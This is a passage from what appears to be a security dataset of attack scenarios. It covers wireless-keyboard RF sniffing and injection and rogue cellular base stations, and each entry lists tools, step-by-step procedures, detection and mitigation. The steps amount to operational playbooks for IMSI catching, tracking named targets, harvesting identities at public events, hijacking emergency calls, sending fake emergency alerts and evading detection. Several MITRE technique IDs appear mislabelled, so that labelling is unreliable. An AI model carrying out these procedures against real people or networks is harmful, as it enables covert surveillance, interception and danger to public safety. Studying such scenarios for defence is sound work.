- **MITRE**: T1059.001 (Command and Scripting Interpreter)
- **Impact**: Command execution, backdoor
- **Tools**: MouseJack, Crazyradio PA, Inject script
- **Scenario**: After sniffing keystrokes, attacker injects payload using same wireless protocol to initiate command execution.
- **Attack Steps**: Step 1: Use MouseJack to identify vulnerable Logitech receiver. Step 2: Sniff keystrokes and determine command pattern. Step 3: Modify injection script with malicious payload. Step 4: Replay payload with precision timing. Step 5: Observe remote execution (e.g., open terminal + reverse shell).
- **Detection**: Endpoint behavior monitoring
- **Solution**: Update to secure receivers, disable RF
- **Tags**: MouseJack, Payload Injection

## Sniffing and Mapping Key Patterns via Timing

- **Attack Type**: Sniffing Keystrokes via RF
- **Target**: Wireless Keyboard
- **Vulnerability**: Side-channel timing analysis
- **MITRE**: T1056.001
- **Impact**: Password guessing, side-channel data
- **Tools**: SDR, GQRX, Python timing analyzer
- **Scenario**: Attacker collects keystroke patterns based on RF packet timing, even when encryption is in use.
- **Attack Steps**: Step 1: Capture encrypted RF packets using SDR. Step 2: Measure packet burst intervals for each key press. Step 3: Build timing model for common words/passwords. Step 4: Correlate live inputs to known timing patterns. Step 5: Log matches and infer typed content.
- **Detection**: RF burst anomaly detection
- **Solution**: Use randomized packet delays, secure protocols
- **Tags**: Side-Channel, Timing Attack

## Auto-Connect Exploit on Receiver Pairing

- **Attack Type**: Sniffing Keystrokes via RF
- **Target**: Wireless Keyboard
- **Vulnerability**: Insecure pairing protocol
- **MITRE**: T1557 (Adversary-in-the-Middle)
- **Impact**: Identity theft, session hijack
- **Tools**: Crazyradio PA, Impersonation script
- **Scenario**: Exploit in pairing protocol allows attacker to impersonate a keyboard without user interaction.
- **Attack Steps**: Step 1: Scan for Logitech Unifying receivers in pairing mode. Step 2: Send crafted pairing packets pretending to be a known keyboard. Step 3: Hijack session and capture typed data. Step 4: Stay silent until user types sensitive info. Step 5: Capture and log all keystrokes from hijacked session.
- **Detection**: Monitor device connections
- **Solution**: Patch firmware, use BLE with secure pairing
- **Tags**: RF Hijack, Session Spoof

## Keystroke Inference from RF Spectrum Heatmap

- **Attack Type**: Sniffing Keystrokes via RF
- **Target**: Wireless Keyboard
- **Vulnerability**: EM leakage and RF power analysis
- **MITRE**: T1056.001
- **Impact**: Indirect keystroke leak
- **Tools**: SDR, Heatmap software, MATLAB/Python
- **Scenario**: Build a heatmap of keystroke energy patterns from spectrum data, then infer typing behavior.
- **Attack Steps**: Step 1: Record long RF streams during typing activity. Step 2: Convert RF strength changes into visual heatmap. Step 3: Analyze pattern clusters for key frequencies. Step 4: Associate patterns with character inputs. Step 5: Use in future to predict inputs based on energy signature.
- **Detection**: RF environment baseline, anomaly detection
- **Solution**: Randomized burst strengths, protocol hardening
- **Tags**: Heatmap Analysis, EM Signatures

## Unintentional Keystroke Broadcast to Multiple Receivers

- **Attack Type**: Sniffing Keystrokes via RF
- **Target**: Wireless Keyboard
- **Vulnerability**: Multi-receiver bug, no device binding
- **MITRE**: T1056.001
- **Impact**: Keystroke leakage to unauthorized device
- **Tools**: Generic RF receiver, Laptop
- **Scenario**: In some models, keyboards transmit to multiple receivers simultaneously if within range. Attacker listens with own dongle.
- **Attack Steps**: Step 1: Identify keyboard model known for multi-receiver flaw. Step 2: Set up matching USB dongle near the target. Step 3: Observe if keyboard broadcasts inputs to both devices. Step 4: Log keystrokes in real-time using standard RF tools. Step 5: Exfiltrate data over Wi-Fi.
- **Detection**: Monitor device IDs in HID list
- **Solution**: Update firmware, single receiver enforcement
- **Tags**: Broadcast Flaw, Twin Sniff

## RF Packet Capture & Reassembly Using GRC

- **Attack Type**: Sniffing Keystrokes via RF
- **Target**: Wireless Keyboard
- **Vulnerability**: Proprietary protocol reverse-engineered, weak signal encoding
- **MITRE**: T1056.001 (Input Capture: Keylogging)
- **Impact**: Real-time credential theft, surveillance
- **Tools**: RTL-SDR, GNU Radio Companion (GRC), Python decoder script
- **Scenario**: Attacker builds a custom GNU Radio Companion (GRC) flowgraph to capture 2.4GHz signals from a vulnerable wireless keyboard and reassemble them into characters.
- **Attack Steps**: Step 1: Install GNU Radio Companion (GRC) on a Linux system (e.g., Ubuntu or Kali). Step 2: Connect RTL-SDR dongle to the system and verify it's detected using rtl_test. Step 3: Open GRC and create a flowgraph that includes RTL-SDR source block set to 2.4GHz. Step 4: Add signal processing blocks to demodulate the raw RF stream. Step 5: Log captured bitstream into a file for analysis. Step 6: Use a Python script to interpret bit patterns into keystrokes using known encoding schemes (based on vendor protocol leaks). Step 7: Reconstruct full typed sentences or passwords.
- **Detection**: Continuous RF monitoring, IDS with SDR support
- **Solution**: Use AES-encrypted keyboards, firmware upgrades
- **Tags**: GNU Radio, Protocol Reversal, SDR Capture

## Side-Channel Exploit via Audio Interference on RF

- **Attack Type**: Sniffing Keystrokes via RF
- **Target**: Wireless Keyboard
- **Vulnerability**: Electromagnetic emission interpreted via sound
- **MITRE**: T1056.001
- **Impact**: Covert keylogging without RF contact
- **Tools**: Audio amp with coil antenna, Soundcard with high sampling rate, Audacity
- **Scenario**: An attacker observes that some keyboards emit slight electromagnetic interference, which can be picked up as side-channel audio signals and processed for keystroke extraction.
- **Attack Steps**: Step 1: Place the coil antenna near the wireless keyboard and connect it to a high-quality soundcard. Step 2: Record the ambient signal while the target is typing using Audacity. Step 3: Use time markers to isolate key press events in the waveform. Step 4: Convert each audio pattern to keystrokes by matching waveforms using an existing key-sound library or building one. Step 5: Log reconstructed keystrokes for later analysis or exfiltration. Step 6: Optionally, repeat in various acoustic environments to evaluate accuracy.
- **Detection**: EM shielding audits, audio anomaly detection
- **Solution**: Shielding, white noise generators
- **Tags**: Side Channel, EM Audio, Coil Sniffing

## Exploiting Unencrypted MAC Address Broadcasts

- **Attack Type**: Sniffing Keystrokes via RF
- **Target**: Wireless Keyboard
- **Vulnerability**: Broadcast reveals device identity and range
- **MITRE**: T1595.002 (Active Scanning: Wireless Scanning)
- **Impact**: Long-range targeting, surveillance
- **Tools**: SDR dongle, Wireshark (with plugin), MAC filter script
- **Scenario**: Some legacy wireless keyboards regularly broadcast MAC addresses in plaintext, allowing attackers to target them selectively from afar.
- **Attack Steps**: Step 1: Set up an SDR with a compatible tool (e.g., GQRX or Wireshark plugin) to passively scan 2.4GHz spectrum. Step 2: Look for unencrypted MAC address patterns in repeated bursts from devices. Step 3: Filter known MAC vendor prefixes associated with keyboard/mouse brands (e.g., Logitech, Microsoft). Step 4: Tag the active devices and log their activity frequency. Step 5: Use the MAC info to target the specific user later via sniffing or injection attacks.
- **Detection**: RF monitoring, MAC activity alerts
- **Solution**: MAC filtering, firmware update to stop leak
- **Tags**: MAC Broadcast, RF Profiling

## Timing-based Recovery on Encrypted RF Streams

- **Attack Type**: Sniffing Keystrokes via RF
- **Target**: Wireless Keyboard
- **Vulnerability**: Side-channel via transmission timing
- **MITRE**: T1056.001
- **Impact**: Partial password reconstruction
- **Tools**: SDR, Inspectrum, Python analysis toolkit
- **Scenario**: Despite encrypted data, attackers use inter-packet delays to statistically infer typing behavior and common passwords.
- **Attack Steps**: Step 1: Capture encrypted keystroke RF transmissions using SDR (focus on packet timing, not content). Step 2: Isolate the transmission time intervals between successive packets. Step 3: Map typing speed and rhythm to patterns from leaked password datasets (e.g., typing "password" has distinctive delays). Step 4: Use clustering algorithms to match captured sequences to likely plaintext. Step 5: Report confidence score for each guessed password. Step 6: Repeat with multiple captures for higher accuracy.
- **Detection**: Packet timing analysis tools, keystroke pattern alerts
- **Solution**: Add jitter to RF packet delays, switch to BLE 5.0+
- **Tags**: Timing Leak, Keystroke Pattern Guessing

## Firmware Downgrade Attack to Disable Encryption

- **Attack Type**: Sniffing Keystrokes via RF
- **Target**: Wireless Keyboard Receiver
- **Vulnerability**: Firmware downgrade without validation
- **MITRE**: T1542.001 (Pre-OS Boot: System Firmware)
- **Impact**: Long-term keystroke surveillance
- **Tools**: Crazyradio PA, Firmware fuzzer toolkit, USB injector
- **Scenario**: Attacker forces a downgrade on a wireless keyboard receiver, disabling its encryption and exposing all keystrokes.
- **Attack Steps**: Step 1: Identify a vulnerable Logitech or similar RF receiver via vendor ID (VID/PID) scanning. Step 2: Use a USB injector to push a crafted downgrade firmware request to the device. Step 3: Upon downgrade, monitor if the LED blinks or receiver resets — indicating firmware reload. Step 4: Start sniffing RF packets, which are now unencrypted. Step 5: Capture all keyboard activity in plain text. Step 6: Log data and restore original firmware to cover tracks.
- **Detection**: Endpoint firmware monitoring
- **Solution**: Enable firmware signing, block downgrade via GPO
- **Tags**: Firmware Attack, Downgrade, RF Leak

## Basic IMSI Catcher Setup in Lab

- **Attack Type**: Cellular Attacks (2G/3G/4G/5G)
- **Target**: Smartphones
- **Vulnerability**: Lack of authentication between device and BTS in 2G
- **MITRE**: T1430 (Identity Capture via IMSI Catcher)
- **Impact**: Device Tracking, Privacy Violation
- **Tools**: SDR (HackRF/USRP), OpenBTS, Laptop with Linux
- **Scenario**: An attacker sets up a rogue 2G base station (BTS) using SDR to capture IMSIs from nearby mobile devices
- **Attack Steps**: Step 1: Install OpenBTS and necessary SDR drivers on a Linux machine.Step 2: Connect and configure SDR device (e.g., HackRF).Step 3: Launch OpenBTS and set it to broadcast as a fake GSM tower.Step 4: Nearby phones automatically connect to the fake BTS thinking it's a legitimate tower.Step 5: Use OpenBTS logs to capture IMSI numbers from connected phones.Step 6: Stop the base station and analyze IMSI logs for device identities.
- **Detection**: RF Spectrum Analysis, Cellular Logs
- **Solution**: Disable 2G on devices, use secure SIM cards
- **Tags**: IMSI Catcher, SDR, 2G Exploit

## Downgrade from 4G to 2G Using Rogue BTS

- **Attack Type**: Cellular Attacks (2G/3G/4G/5G)
- **Target**: Mobile Phones
- **Vulnerability**: Insecure 2G fallback
- **MITRE**: T1430, T1467
- **Impact**: Interception risk, privacy leaks
- **Tools**: YateBTS, SDR, Linux, Firewall Rules
- **Scenario**: Exploit devices that support fallback to insecure 2G by forcing them to connect to a rogue 2G tower
- **Attack Steps**: Step 1: Set up YateBTS on a laptop with SDR.Step 2: Configure tower to appear as a legitimate LTE provider but only offer 2G.Step 3: Emit stronger signal than nearby real towers.Step 4: Devices will fall back to 2G and connect.Step 5: Log IMSIs and observe SMS metadata or potential calls.Step 6: Educate on risks of fallback-based vulnerabilities.
- **Detection**: Anomaly detection in fallback behavior
- **Solution**: Force LTE-only on devices, disable 2G
- **Tags**: Downgrade Attack, LTE Fallback

## IMSI Catcher for Movement Tracking

- **Attack Type**: Cellular Attacks (2G/3G/4G/5G)
- **Target**: Mobile Phone Users
- **Vulnerability**: No encryption on IMSI broadcasts
- **MITRE**: T1430
- **Impact**: Physical tracking, privacy invasion
- **Tools**: Multiple SDR Units, GPS, OpenBTS
- **Scenario**: An attacker sets up multiple IMSI catchers to track a person’s movement across locations
- **Attack Steps**: Step 1: Deploy small SDR + OpenBTS setups across key locations (e.g., café, office).Step 2: Each fake BTS captures IMSIs that connect within range.Step 3: Correlate captured IMSIs from multiple locations using timestamps.Step 4: Map the user's movement pattern using GPS logs.Step 5: Educate users on how location privacy can be compromised.Step 6: Use logs to show repeated tracking of same IMSI.
- **Detection**: Cross-location IMSI log correlation
- **Solution**: Use encrypted SIMs, temporary IMSIs (TMSI)
- **Tags**: Tracking, Surveillance, Privacy

## Capturing SMS Metadata via Fake BTS

- **Attack Type**: Cellular Attacks (2G/3G/4G/5G)
- **Target**: Mobile Devices
- **Vulnerability**: SMS sent over unencrypted 2G
- **MITRE**: T1420, T1430
- **Impact**: SMS surveillance, profiling
- **Tools**: OpenBTS, SDR, Wireshark
- **Scenario**: A rogue BTS is used to capture metadata (sender, time, number) of unencrypted SMS sent over 2G
- **Attack Steps**: Step 1: Set up rogue 2G base station with OpenBTS.Step 2: Configure BTS to relay SMS messages but log metadata.Step 3: Have a test phone send SMS while connected to rogue BTS.Step 4: Observe sender/receiver numbers and timestamps in logs.Step 5: Extract SMS metadata using Wireshark or BTS logs.Step 6: Explain how metadata can be exploited even if message body is encrypted.
- **Detection**: Manual review of BTS logs
- **Solution**: Prefer secure messaging apps, avoid SMS on 2G
- **Tags**: SMS Interception, Metadata Harvesting

## Voice Call Interception with GSM BTS

- **Attack Type**: Cellular Attacks (2G/3G/4G/5G)
- **Target**: Test Phones
- **Vulnerability**: No encryption in GSM voice
- **MITRE**: T1422 (Interception)
- **Impact**: Eavesdropping on calls
- **Tools**: OpenBTS, SDR, VoIP Tools
- **Scenario**: In a lab setting, a rogue BTS relays and records GSM voice calls between two test phones
- **Attack Steps**: Step 1: Set up a rogue GSM BTS using OpenBTS and connect two test phones.Step 2: Initiate a call between the test phones.Step 3: Configure BTS to relay voice using SIP to VoIP software.Step 4: Capture and store call audio using VoIP recorder.Step 5: Play back call recording and show how unencrypted GSM voice can be intercepted.Step 6: Discuss mitigation strategies like using end-to-end encrypted VoIP.
- **Detection**: VoIP log monitoring, SDR analysis
- **Solution**: Use 3G/4G or encrypted VoIP
- **Tags**: Voice Intercept, GSM Weakness

## Targeted IMSI Harvesting at Events

- **Attack Type**: Cellular Attacks (2G/3G/4G/5G)
- **Target**: Public Cellular Devices
- **Vulnerability**: 2G lacks mutual authentication
- **MITRE**: T1430
- **Impact**: Mass identity leakage
- **Tools**: SDR, YateBTS, GPS Logging, Laptop
- **Scenario**: The attacker plants a fake base station near a public event to collect IMSI numbers from high-density mobile devices
- **Attack Steps**: Step 1: Set up YateBTS with a laptop and SDR.Step 2: Choose a location near an event (e.g., concert or rally).Step 3: Configure fake BTS with high signal strength to outcompete real towers.Step 4: Collect logs of all connecting IMSIs.Step 5: Use GPS module to correlate location and timestamp.Step 6: Filter for repeat or suspicious IMSIs (e.g., officials, organizers).Step 7: Stop operation and analyze offline.
- **Detection**: Cellular anomaly monitoring
- **Solution**: Enforce 4G/5G only mode, IMSI obfuscation
- **Tags**: Event Surveillance, IMSI Catcher

## Fake BTS with Fake Emergency Alerts

- **Attack Type**: Cellular Attacks (2G/3G/4G/5G)
- **Target**: All Phones in Range
- **Vulnerability**: Lack of verification in 2G cell broadcast
- **MITRE**: T1431 (Malicious Broadcast Message)
- **Impact**: Panic, misinformation
- **Tools**: OpenBTS, SDR, Custom Cell Broadcast App
- **Scenario**: Rogue BTS is used to push fake emergency broadcasts or alerts to devices via SMS or Cell Broadcast
- **Attack Steps**: Step 1: Configure OpenBTS to act as a 2G tower.Step 2: Develop a message injection script for emergency alert format.Step 3: Broadcast cell broadcast alerts (e.g., “Evacuate Area”).Step 4: Observe mobile phones receiving messages.Step 5: Educate on risks of fake alerts and misinformation.Step 6: Remove fake BTS after simulation.
- **Detection**: Cell broadcast logging on telco backend
- **Solution**: Secure broadcast protocols (5G), app validation
- **Tags**: Fake Alerts, Broadcast Abuse

## Multi-Band Rogue Tower for 2G-4G

- **Attack Type**: Cellular Attacks (2G/3G/4G/5G)
- **Target**: Smartphones
- **Vulnerability**: Trust in strongest signal across bands
- **MITRE**: T1430, T1440
- **Impact**: IMSI capture, device profiling
- **Tools**: SDR (LimeSDR), SRSRAN, Multi-band Antennas
- **Scenario**: Attacker sets up a rogue tower that mimics multiple bands to lure a variety of phones
- **Attack Steps**: Step 1: Install SRSRAN on Linux machine.Step 2: Configure multi-band support for 2G, 3G, 4G using LimeSDR.Step 3: Deploy antennas and broadcast all bands.Step 4: Monitor logs for connection attempts.Step 5: Capture IMSI, phone brand, network type.Step 6: Display difference in fallback behavior.Step 7: Explain carrier aggregation and how phones switch.
- **Detection**: Deep packet inspection, tower triangulation
- **Solution**: Enforce carrier lock, disable auto band-switch
- **Tags**: Multi-band, SDR, Advanced Simulation

## IMSI Catching with Geofencing Alert

- **Attack Type**: Cellular Attacks (2G/3G/4G/5G)
- **Target**: Known User
- **Vulnerability**: IMSIs sent in plaintext
- **MITRE**: T1430
- **Impact**: Targeted tracking and alerting
- **Tools**: YateBTS, SQLite Script, Alert Script (Python)
- **Scenario**: A rogue BTS is used to alert attacker when a specific IMSI enters a region
- **Attack Steps**: Step 1: Set up YateBTS to collect IMSIs into a SQLite DB.Step 2: Load target IMSI(s) into an “alert list.”Step 3: Write Python script to monitor DB and send alert when match found.Step 4: Deploy near target area (office, store).Step 5: When target connects, system sends email/SMS to attacker.Step 6: Show concept of geofencing via cellular ID tracking.
- **Detection**: Location triangulation, behavior anomaly
- **Solution**: Use TMSI, 5G pseudonymization
- **Tags**: IMSI Geofence, Alerting System

## IMSI De-Anonymization with Call/SMS Logs

- **Attack Type**: Cellular Attacks (2G/3G/4G/5G)
- **Target**: Any Mobile User
- **Vulnerability**: Weak metadata protection in 2G
- **MITRE**: T1420, T1430
- **Impact**: Identity exposure, doxxing
- **Tools**: OpenBTS, Wireshark, Phonebooks
- **Scenario**: After capturing IMSIs, attacker correlates with known call or SMS activity to identify user
- **Attack Steps**: Step 1: Set up rogue 2G BTS.Step 2: Capture IMSIs and any outgoing calls/SMS.Step 3: Note timestamp, phone number, or message header.Step 4: Use caller-ID databases or leaked phonebooks to match number to identity.Step 5: Match IMSI to identity using logs.Step 6: Demonstrate how metadata can break anonymity.
- **Detection**: Analysis of call/SMS pattern
- **Solution**: Use VoIP or encrypted calls/SMS
- **Tags**: Metadata Analysis, IMSI Linkage

## Device Type Fingerprinting via Rogue BTS

- **Attack Type**: Cellular Attacks (2G/3G/4G/5G)
- **Target**: Smartphones, IoT
- **Vulnerability**: Device identity exposed in connect requests
- **MITRE**: T1430, T1447
- **Impact**: Targeted surveillance or phishing
- **Tools**: SRSRAN, OpenLTE, Log Parsers
- **Scenario**: Attacker captures device types/models based on registration messages sent to fake BTS
- **Attack Steps**: Step 1: Set up LTE/2G BTS using SDR and software.Step 2: Wait for devices to connect.Step 3: Capture registration request data.Step 4: Extract User-Agent, device model, IMEI prefixes.Step 5: Build table mapping device models to IMSIs.Step 6: Use for targeted phishing or testing.Step 7: End simulation and clear logs.
- **Detection**: Monitor device behavior across BTS
- **Solution**: Encrypt metadata, anonymize IMEI
- **Tags**: Fingerprinting, Surveillance

## Forced Roaming Redirection to Rogue BTS

- **Attack Type**: Cellular Attacks (2G/3G/4G/5G)
- **Target**: Roaming-enabled Devices
- **Vulnerability**: Trust in roaming codes
- **MITRE**: T1430, T1444
- **Impact**: Bypass regional filters, data collection
- **Tools**: OpenBTS, MCC/MNC Spoofing
- **Scenario**: Rogue BTS tricks phones into roaming to attacker’s network by mimicking foreign MCC/MNC
- **Attack Steps**: Step 1: Setup OpenBTS and SDR.Step 2: Configure fake MCC/MNC to mimic a foreign but allowed roaming network.Step 3: Phones with global roaming connect thinking they’re abroad.Step 4: Log IMSI, device details.Step 5: Replay scenario to show risks of international spoofing.Step 6: Discuss how MNC/MCC logic works.
- **Detection**: Monitor SIM profiles and logs
- **Solution**: Lock to home network only
- **Tags**: Roaming, Network Spoof

## Emergency Call Hijack via Fake BTS

- **Attack Type**: Cellular Attacks (2G/3G/4G/5G)
- **Target**: Mobile Users in Danger
- **Vulnerability**: 2G allows emergency call redirection
- **MITRE**: T1432 (Call Hijacking)
- **Impact**: Life-threatening deception
- **Tools**: OpenBTS, VoIP Software, Call Router
- **Scenario**: A rogue BTS is configured to accept emergency calls and reroute them to a fake responder
- **Attack Steps**: Step 1: Setup BTS to accept emergency calls (e.g., 112, 911).Step 2: Configure routing to attacker-controlled VoIP softphone.Step 3: User places emergency call; BTS accepts and reroutes.Step 4: Attacker plays a pre-recorded message or interacts.Step 5: Demonstrate ethical implications only in lab setting.Step 6: Emphasize use of encryption in real-world LTE emergency calling.
- **Detection**: Telecom backend audit
- **Solution**: Use VoLTE, emergency fallback hardcoded
- **Tags**: Emergency, Social Engineering

## Mass DoS via Fake BTS

- **Attack Type**: Cellular Attacks (2G/3G/4G/5G)
- **Target**: Mobile Network Subscribers
- **Vulnerability**: Device trusts tower with highest signal
- **MITRE**: T1435 (Service Denial)
- **Impact**: Mobile network blackout
- **Tools**: OpenBTS, SDR, BTS Jammer Script
- **Scenario**: Fake base station causes phones to lose real network by repeatedly attaching/detaching them
- **Attack Steps**: Step 1: Deploy rogue BTS with same MCC/MNC as real network.Step 2: Set power higher than real tower.Step 3: Force devices to attach but refuse further registration.Step 4: Devices stuck in loop between real and fake.Step 5: Demonstrate DoS as phones fail to reach real network.Step 6: Discuss implications for first responders, public safety.
- **Detection**: RF Monitoring Tools
- **Solution**: Signal filtering, allowlist of towers
- **Tags**: Cellular DoS, Fake Attach

## SIM Toolkit Abuse via Rogue BTS

- **Attack Type**: Cellular Attacks (2G/3G/4G/5G)
- **Target**: Legacy SIM Cards
- **Vulnerability**: Insecure SIM Toolkit processing
- **MITRE**: T1446
- **Impact**: UI spoofing, message sending
- **Tools**: SIMtrace, OpenBTS, Custom STK App
- **Scenario**: SIMs with toolkit functionality are triggered remotely by rogue tower to display UI or send SMS
- **Attack Steps**: Step 1: Set up rogue tower with SIM Application Toolkit triggers.Step 2: When phones connect, push proactive STK command.Step 3: Phone executes command: e.g., show message, send SMS.Step 4: Observe behavior without user consent.Step 5: Teach how older SIMs can be manipulated.Step 6: Use modern SIMs to show mitigation.
- **Detection**: SIM behavior logging
- **Solution**: Disable STK, use modern SIMs
- **Tags**: SIM Toolkit, UI Abuse

## Real-time Location Approximation via Signal Strength

- **Attack Type**: Cellular Attacks (2G/3G/4G/5G)
- **Target**: Mobile Phone (Moving)
- **Vulnerability**: Devices connect to strongest cell without validating base station
- **MITRE**: T1430, T1418
- **Impact**: Passive movement tracking without consent
- **Tools**: SDR, YateBTS, GPS Logger, Signal Strength Monitor
- **Scenario**: A rogue BTS is used in multiple locations to detect presence and movement direction of a mobile device based on connection signal strength
- **Attack Steps**: Step 1: Set up multiple SDRs and YateBTS units across small mapped regions (e.g., rooms or street blocks).Step 2: Start each rogue BTS with a unique Cell ID.Step 3: As a target phone moves, log which BTS it connects to and record signal strength (RSSI).Step 4: Note the timestamps and RSSI values from each station.Step 5: Plot estimated position using triangulation techniques.Step 6: Discuss how attackers can "see" people moving even without GPS or data connection.Step 7: Simulate walking through space while tracking device logs.
- **Detection**: RF triangulation systems, signal strength heatmaps
- **Solution**: Use TMSI rotation, only enable 4G/5G, disable 2G
- **Tags**: Location tracking, IMSI, signal mapping

## Rogue BTS for SIM Card Enumeration

- **Attack Type**: Cellular Attacks (2G/3G/4G/5G)
- **Target**: Mobile Devices (Any SIM)
- **Vulnerability**: IMSI reveals carrier ID in plaintext
- **MITRE**: T1430
- **Impact**: SIM profiling for targeting or surveillance
- **Tools**: SDR, OpenBTS, Carrier MCC/MNC List, SQLite DB
- **Scenario**: Attacker uses rogue BTS to determine which SIM cards belong to which network providers for profiling or pretexting
- **Attack Steps**: Step 1: Set up OpenBTS with logging enabled.Step 2: Create a local SQLite DB to log captured IMSIs and decode MCC (Mobile Country Code) and MNC (Mobile Network Code).Step 3: Collect data from connecting devices.Step 4: Decode IMSIs to identify carrier (e.g., Vodafone, Airtel).Step 5: Build stats showing device distribution by network.Step 6: Teach how this can aid in phishing, social engineering, or profiling attacks.Step 7: Compare results with real-world carrier allocations.
- **Detection**: Telecom MCC/MNC matching
- **Solution**: Use TMSI, avoid static IMSI exposure
- **Tags**: SIM Enumeration, Carrier Profiling

## IMSI Rotation Test with Rogue BTS

- **Attack Type**: Cellular Attacks (2G/3G/4G/5G)
- **Target**: Test Devices (Varied SIMs)
- **Vulnerability**: Persistent TMSI leaks movement and identity
- **MITRE**: T1430
- **Impact**: Failure to anonymize user over time
- **Tools**: SDR, OpenBTS, Logging Script
- **Scenario**: Test devices are evaluated to see whether they rotate TMSI (Temporary IMSI) to protect user identity over time
- **Attack Steps**: Step 1: Set up OpenBTS to log IMSIs and temporary IDs (TMSIs) over multiple sessions.Step 2: Turn on test phone and allow it to register.Step 3: Note the assigned TMSI in BTS logs.Step 4: Disconnect and reconnect device periodically.Step 5: Check if TMSI is rotated after each session.Step 6: If TMSI stays the same, note the privacy implications.Step 7: Educate on importance of identity rotation in 3G/4G/5G.
- **Detection**: Compare TMSI values over multiple sessions
- **Solution**: Enforce dynamic TMSI rotation via SIM/carrier
- **Tags**: Identity Management, Mobile Privacy

## GSM Call Injection via Spoofed Base Station

- **Attack Type**: Cellular Attacks (2G/3G/4G/5G)
- **Target**: GSM Devices
- **Vulnerability**: Caller ID not authenticated in GSM
- **MITRE**: T1422, T1424
- **Impact**: Phishing, vishing attacks
- **Tools**: OpenBTS, Softphone, Call Routing Script
- **Scenario**: A rogue base station simulates a GSM network and initiates fake calls to devices that appear to come from a legitimate source
- **Attack Steps**: Step 1: Deploy rogue GSM BTS using OpenBTS.Step 2: Program it to initiate an inbound call to a nearby phone (simulated test number).Step 3: Use a softphone client to simulate the "calling party" (e.g., a bank or government agency).Step 4: Send a voice recording or interactive prompt.Step 5: Demonstrate how users might respond to fake calls that look legitimate.Step 6: Log the call details and response behavior for analysis.Step 7: Educate on caller spoofing and phishing over cellular networks.
- **Detection**: SIM-based call logs, base station anomaly
- **Solution**: Switch to VoLTE, educate on vishing
- **Tags**: Call Injection, Voice Phishing

## IMSI Catcher with Anti-Detection Mode

- **Attack Type**: Cellular Attacks (2G/3G/4G/5G)
- **Target**: All Cellular Devices
- **Vulnerability**: Detection relies on signal anomalies
- **MITRE**: T1430, T1471
- **Impact**: Avoids being flagged as malicious tower
- **Tools**: SDR, YateBTS, Signal Profiler, Low-Power Transmit Script
- **Scenario**: An attacker modifies the rogue BTS to mimic characteristics of real towers (like signal power and timing) to evade detection by scanning apps or spectrum monitors
- **Attack Steps**: Step 1: Set up rogue BTS with carefully tuned power levels matching nearby towers.Step 2: Match broadcast parameters like Cell ID, Location Area Code (LAC), and Timing Advance.Step 3: Enable adaptive power adjustment to avoid spikes.Step 4: Limit IMSI capture rate to avoid statistical anomalies.Step 5: Run tests using mobile threat detection apps (e.g., AIMSICD).Step 6: Observe whether device or app detects anomaly.Step 7: Teach about evasion techniques and challenges of detection.
- **Detection**: Mobile anomaly detection tools, signal comparison
- **Solution**: Promote 4G/5G authentication, mobile threat defense apps
- **Tags**: Stealth IMSI Catcher, Detection Evasion

## LTE to 2G Downgrade via Rogue eNodeB

- **Attack Type**: LTE/5G Downgrade Attack
- **Target**: Smartphone
- **Vulnerability**: Protocol fallback mechanism
- **MITRE**: T1431 - Downgrade Attack
- **Impact**: Traffic interception, IMSI capture
- **Tools**: srsRAN, USRP B210, OpenBTS, SIMtrace2
- **Scenario**: Attacker uses rogue LTE base station to force victim devices to connect to insecure 2G network.
- **Attack Steps**: Step 1: Set up a USRP B210 SDR device and install srsRAN to emulate a rogue LTE base station. Step 2: Configure eNodeB with strong LTE signal to attract nearby smartphones.Step 3: Monitor UE attach requests; deny all except the ones matching target IMSI.Step 4: Force Detach the UE using LTE signaling and respond with “Service Not Allowed”.Step 5: Victim’s device falls back to 2G automatically.Step 6: Launch OpenBTS on 2G band to impersonate 2G tower.Step 7: Intercept voice/SMS traffic or conduct MITM attacks.
- **Detection**: Detect rogue eNodeB broadcasts using spectrum monitoring tools
- **Solution**: Enforce minimum RAT policies (disable 2G fallback), whitelist PLMN IDs
- **Tags**: LTE, 2G, IMSI Catcher, SDR

## Forced LTE to Non-Encrypted 3G

- **Attack Type**: LTE/5G Downgrade Attack
- **Target**: Mobile Device
- **Vulnerability**: No encryption enforcement in legacy fallback
- **MITRE**: T1431
- **Impact**: Call/SMS eavesdropping, surveillance
- **Tools**: YateBTS, BladeRF, Wireshark
- **Scenario**: Attacker manipulates LTE signaling to trigger a handover to 3G with no mutual authentication.
- **Attack Steps**: Step 1: Deploy YateBTS to simulate a 3G NodeB.Step 2: Simultaneously operate a fake LTE cell using srsRAN with strong signal.Step 3: Broadcast LTE Attach Reject with “ESM Failure - No Service”.Step 4: Device initiates connection to next available network—3G.Step 5: Accept UE on rogue 3G cell with no encryption (disable ciphering).Step 6: Capture unencrypted traffic and IMSI.Step 7: Optionally perform fake SMS delivery or intercept calls.
- **Detection**: Monitor for high rejection rates from LTE
- **Solution**: Enforce 4G/5G-only mode on devices, SIM with authentication-only policy
- **Tags**: 3G, LTE, Downgrade, Ciphering Disabled

## Null Cipher Attack via LTE Fallback

- **Attack Type**: LTE/5G Downgrade Attack
- **Target**: Smartphone
- **Vulnerability**: Insecure legacy fallbacks with weak cipher negotiation
- **MITRE**: T1431
- **Impact**: Sensitive data sniffing
- **Tools**: OpenLTE, SIMtrace2, HackRF
- **Scenario**: Using LTE rejection and improper 3G config, attacker forces phone into null cipher mode.
- **Attack Steps**: Step 1: Use OpenLTE to operate rogue LTE cell broadcasting high signal.Step 2: Send fake “Attach Reject” messages to target devices repeatedly.Step 3: Device falls back to 3G without confirming cipher mode.Step 4: Configure the fake 3G tower to accept connections with null cipher.Step 5: Use Wireshark or SIMtrace2 to monitor and log communications.Step 6: Exploit the unencrypted session to sniff messages, possibly inject commands.
- **Detection**: Mobile OS logs show fallback & unencrypted mode warnings
- **Solution**: Disable legacy 3G/2G from baseband settings
- **Tags**: Null Cipher, LTE Rejection, SIMtrace

## 5G to LTE Downgrade and IMSI Catching

- **Attack Type**: LTE/5G Downgrade Attack
- **Target**: 5G Smartphone
- **Vulnerability**: Lack of encryption before IMSI exposure in LTE
- **MITRE**: T1431
- **Impact**: IMSI leakage, location tracking
- **Tools**: Amarisoft LTE Callbox, USRP, SrsRAN
- **Scenario**: Attacker uses SDR to spoof a 5G tower and forces downgrade to LTE to grab device IMSI.
- **Attack Steps**: Step 1: Configure Amarisoft 5G Callbox with a spoofed PLMN to match victim’s carrier.Step 2: Simulate temporary service rejection (Service Not Allowed) on 5G.Step 3: Device falls back to LTE for continuity.Step 4: Launch rogue LTE eNodeB using SrsRAN on fallback band.Step 5: Accept connection and capture device IMSI before encryption starts.Step 6: Log and correlate IMSIs to known subscriber identities.
- **Detection**: RF monitors detect rogue 5G tower and fallback events
